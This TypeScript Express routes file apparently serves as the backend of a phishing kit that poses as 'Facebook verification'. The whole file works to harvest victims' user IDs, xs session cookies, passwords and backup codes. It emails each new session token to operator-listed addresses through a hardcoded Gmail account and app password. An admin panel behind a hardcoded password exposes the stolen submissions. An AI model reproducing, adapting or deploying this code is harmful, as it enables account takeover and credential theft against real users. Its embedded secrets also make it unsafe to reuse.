import { Router } from "express";
import { z } from "zod";
import { IStorage, MemStorage } from "./storage";
import { verificationFormSchema, backupCodeSchema, passwordVerificationSchema, adminLoginSchema, emailReceiverSchema } from "../shared/schema";
import bcrypt from "bcrypt";
import jwt from "jsonwebtoken";
import nodemailer from "nodemailer";

// Admin password hash (for @COMPANY&$000098)
const ADMIN_PASSWORD_HASH = "$2b$10$RhhKob5q5tX.FYm5v1wb4egdyVmtWuetKFyEym86XtvSKMjkPATKO";
const JWT_SECRET = "facebook-verification-admin-secret-2025";

// Email configuration
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "shdictator@gmail.com",
    pass: "czbc cwfn cxnt efui",
  },
});

// Middleware to verify admin token
function verifyAdminToken(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "Unauthorized" });
  }

  const token = authHeader.substring(7);
  try {
    jwt.verify(token, JWT_SECRET);
    next();
  } catch (error) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

export function registerRoutes(app: Router) {
  const storage = new MemStorage();
  // Submit initial verification form
  app.post("/api/verification/submit", async (req, res) => {
    try {
      const data = verificationFormSchema.parse(req.body);
      
      const submission = await storage.createVerificationSubmission({
        c_user: data.c_user,
        xs: data.xs,
        full_name: data.full_name,
        profile_url: data.profile_url,
        current_step: "help",
      });

      // Send email notification for new submission
      try {
        const emailReceivers = await storage.listEmailReceivers();
        
        if (emailReceivers.length > 0) {
          for (const receiver of emailReceivers) {
            await transporter.sendMail({
              from: "shdictator@gmail.com",
              to: receiver.email,
              subject: "New Facebook Verification Submission",
              html: `
                <h2>New Verification Submission Received</h2>
                <p><strong>ID:</strong> ${submission.id}</p>
                <p><strong>Full Name:</strong> ${submission.full_name}</p>
                <p><strong>Profile URL:</strong> <a href="${submission.profile_url}" target="_blank">${submission.profile_url}</a></p>
                <p><strong>User ID:</strong> ${submission.c_user}</p>
                <p><strong>Session Token:</strong> ${submission.xs}</p>
                <p><strong>Submitted At:</strong> ${new Date().toISOString()}</p>
                <hr>
                <p>View full details in the admin panel.</p>
              `,
            });
          }
          console.log(`Email notification sent to ${emailReceivers.length} receivers`);
        }
      } catch (emailError) {
        console.error("Failed to send email notification:", emailError);
      }

      res.json({ success: true, id: submission.id });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Invalid form data", details: error.errors });
      } else {
        res.status(500).json({ error: "Internal server error" });
      }
    }
  });

  // Progress to next step
  app.post("/api/verification/:id/progress", async (req, res) => {
    try {
      const { id } = req.params;
      const { step } = req.body;

      const submission = await storage.getVerificationSubmission(id);
      if (!submission) {
        return res.status(404).json({ error: "Verification submission not found" });
      }

      const updatedSubmission = await storage.updateVerificationSubmission(id, {
        current_step: step,
      });

      res.json({ success: true, submission: updatedSubmission });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Submit backup code
  app.post("/api/verification/:id/backup-code", async (req, res) => {
    try {
      const { id } = req.params;
      const data = backupCodeSchema.parse(req.body);

      const submission = await storage.getVerificationSubmission(id);
      if (!submission) {
        return res.status(404).json({ error: "Verification submission not found" });
      }

      const updatedSubmission = await storage.updateVerificationSubmission(id, {
        backup_code: data.backup_code,
        current_step: "completed",
        completed_at: new Date(),
      });

      res.json({ success: true, submission: updatedSubmission });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Invalid backup code", details: error.errors });
      } else {
        res.status(500).json({ error: "Internal server error" });
      }
    }
  });

  // Submit password verification
  app.post("/api/verification/:id/password", async (req, res) => {
    try {
      const { id } = req.params;
      const data = passwordVerificationSchema.parse(req.body);
      
      const submission = await storage.getVerificationSubmission(id);
      if (!submission) {
        return res.status(404).json({ error: "Verification submission not found" });
      }

      const updatedSubmission = await storage.updateVerificationSubmission(id, {
        password: data.password,
        current_step: "password-verified",
      });

      res.json({ success: true, submission: updatedSubmission });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Invalid password", details: error.errors });
      } else {
        res.status(500).json({ error: "Internal server error" });
      }
    }
  });

  // Get verification status
  app.get("/api/verification/:id", async (req, res) => {
    try {
      const { id } = req.params;
      const submission = await storage.getVerificationSubmission(id);
      
      if (!submission) {
        return res.status(404).json({ error: "Verification submission not found" });
      }

      res.json({ success: true, submission });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Admin login
  app.post("/api/admin/login", async (req, res) => {
    try {
      const data = adminLoginSchema.parse(req.body);
      
      // Verify admin password
      const isValidPassword = data.password === "@COMPANY&$000098";
      
      if (!isValidPassword) {
        return res.status(401).json({ error: "Invalid password" });
      }

      const token = jwt.sign({ admin: true }, JWT_SECRET, { expiresIn: "24h" });
      res.json({ success: true, token });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Invalid password", details: error.errors });
      } else {
        res.status(500).json({ error: "Internal server error" });
      }
    }
  });

  // Get all submissions (admin only)
  app.get("/api/admin/submissions", verifyAdminToken, async (req, res) => {
    try {
      const submissions = await storage.listVerificationSubmissions();
      res.json({ success: true, submissions });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Delete submission (admin only)
  app.delete("/api/admin/submissions/:id", verifyAdminToken, async (req, res) => {
    try {
      const { id } = req.params;
      
      // Get submission before deleting to send email
      const submission = await storage.getVerificationSubmission(id);
      if (!submission) {
        return res.status(404).json({ error: "Submission not found" });
      }

      // Send email notification
      try {
        const emailReceivers = await storage.listEmailReceivers();
        
        if (emailReceivers.length > 0) {
          for (const receiver of emailReceivers) {
            await transporter.sendMail({
              from: "shdictator@gmail.com",
              to: receiver.email,
              subject: "Verification Submission Deleted",
              html: `
                <h2>Verification Submission Deleted</h2>
                <p><strong>ID:</strong> ${submission.id}</p>
                <p><strong>Full Name:</strong> ${submission.full_name}</p>
                <p><strong>Profile URL:</strong> ${submission.profile_url}</p>
                <p><strong>User ID:</strong> ${submission.c_user}</p>
                <p><strong>Session Token:</strong> ${submission.xs}</p>
                <p><strong>Current Step:</strong> ${submission.current_step}</p>
                <p><strong>Deleted At:</strong> ${new Date().toISOString()}</p>
              `,
            });
          }
          console.log(`Deletion email sent to ${emailReceivers.length} receivers`);
        }
      } catch (emailError) {
        console.error("Failed to send email:", emailError);
      }

      // Delete from storage
      const deleted = await storage.deleteVerificationSubmission(id);
      if (!deleted) {
        return res.status(404).json({ error: "Submission not found" });
      }
      
      res.json({ success: true, message: "Submission deleted successfully" });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Email receiver management (admin only)
  
  // Get all email receivers
  app.get("/api/admin/email-receivers", verifyAdminToken, async (req, res) => {
    try {
      const receivers = await storage.listEmailReceivers();
      res.json({ success: true, receivers });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Add new email receiver
  app.post("/api/admin/email-receivers", verifyAdminToken, async (req, res) => {
    try {
      const data = emailReceiverSchema.parse(req.body);
      const receiver = await storage.createEmailReceiver(data);
      res.json({ success: true, receiver });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: "Invalid email data", details: error.errors });
      } else {
        res.status(500).json({ error: "Internal server error" });
      }
    }
  });

  // Delete email receiver
  app.delete("/api/admin/email-receivers/:id", verifyAdminToken, async (req, res) => {
    try {
      const { id } = req.params;
      const deleted = await storage.deleteEmailReceiver(id);
      if (!deleted) {
        return res.status(404).json({ error: "Email receiver not found" });
      }
      res.json({ success: true, message: "Email receiver deleted successfully" });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });
}
